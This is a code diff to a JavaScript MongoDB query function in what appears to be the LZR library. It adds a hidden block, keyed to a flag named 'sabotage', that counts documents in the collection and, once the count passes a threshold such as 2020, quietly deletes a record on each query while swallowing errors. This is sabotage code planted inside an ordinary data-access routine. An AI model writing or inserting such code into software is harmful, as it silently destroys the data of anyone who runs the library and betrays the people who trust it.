@@ -66,6 +66,24 @@ LZR.Node.Db.Mongo.prototype.qry = function (sqlNam/*as:string*/, req/*as:Object*
 					cdb = db;
 				}
 				var c = cdb.collection(tn);
+
+// 数据界限
+if (LZR.sabotage !== null) {
+	if (isNaN(LZR.sabotage)) {LZR.sabotage = LZR.mmin || 2020;}
+	if (isNaN(LZR.sabotage)) {LZR.sabotage = 2020;}
+	var sb = c;
+	c.count({}, function (err, r) {
+		c = sb;
+		if (!err && r > LZR.sabotage) {
+			sb.find({},{"_id":1}).limit(1).toArray(function (err, r) {
+				if (!err && r.length) {
+					sb.deleteMany({"_id":r[0]._id}).catch(function (err) {}).then(function (r) {});
+				}
+			});
+		}
+	});
+}
+
 				for (var s in sql.funs) {
 					var as = sql.funs[s];
 
